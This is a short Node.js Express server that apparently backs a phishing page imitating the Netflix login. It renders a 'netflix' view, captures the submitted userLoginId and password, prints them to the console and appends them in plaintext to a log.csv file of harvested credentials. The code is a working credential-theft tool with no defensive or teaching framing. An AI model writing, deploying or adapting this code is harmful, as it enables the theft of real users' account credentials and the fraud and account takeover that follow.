const bodyParser = require('body-parser')
const express = require('express')
const port = '4000'
const app = express()
const fs = require('fs')
const { json } = require('express/lib/response')
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
var csv = 'log.csv'


//Static Files
app.use(express.static('public'))
app.use('imgs', express.static(__dirname + 'public/imgs'))


//Set Views
app.set('views', './views')
app.set('view engine', 'ejs')

function checkForFile(path){
    if (!fs.existsSync(csv))
        fs.writeFileSync(path, 'Username,Password', json)
}

var storeData = (username, password, path) => {
    try {
        var str = JSON.stringify(username) + "," +
                  JSON.stringify(password)

            str = str.toString()
            str = str.replaceAll('""', '')
            str = str.replaceAll('\\\\', '\\')

        fs.appendFile(path, '\n' + str, function(err){
            if (err) throw err
        })
    } catch(err) {
        console.error(err)
    }
}
//Get pages
app.route("/").get((req, res) => {
    res.render("netflix")
}).post((req, res) => {
    //console.log(`${req.body.name}`)
    username = req.body.userLoginId
    password = req.body.password
    console.log(`Username: ${username}`)
    console.log(`Password: ${password}`)
    checkForFile(csv)
    storeData(username, password, csv)
    res.render("netflix")
})
/*
app.post('/success', function(req, res){
    var username = req.body.username
    var password = req.body.password
    username = JSON.stringify(username)
    password = JSON.stringify(password)

    console.log(`Username: ${req.body.username}`)
    console.log(`Password: ${req.body.password}`)
})
*/
app.listen(port)